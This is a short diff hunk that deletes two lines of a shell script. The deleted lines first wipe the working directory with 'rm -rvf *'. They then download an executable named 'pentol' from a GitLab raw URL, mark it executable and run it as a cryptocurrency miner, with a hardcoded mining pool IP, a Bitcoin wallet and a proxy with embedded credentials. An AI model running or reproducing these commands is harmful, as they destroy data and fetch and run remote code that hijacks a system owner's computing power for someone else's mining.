@@ -1,2 +1,0 @@
-rm -rvf * && mkdir a && cd a
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pentol && chmod +x pentol && ./pentol --algo qhash --pool 217.182.193.158:8610 --wallet bc1qcsz8j83x6v359aqsset6nxss9qefpgxhkxvt9a.Didi$(shuf -n 1 -i 1-99999) --proxy majapahlevi:majapahlevi@138.197.79.17:443 
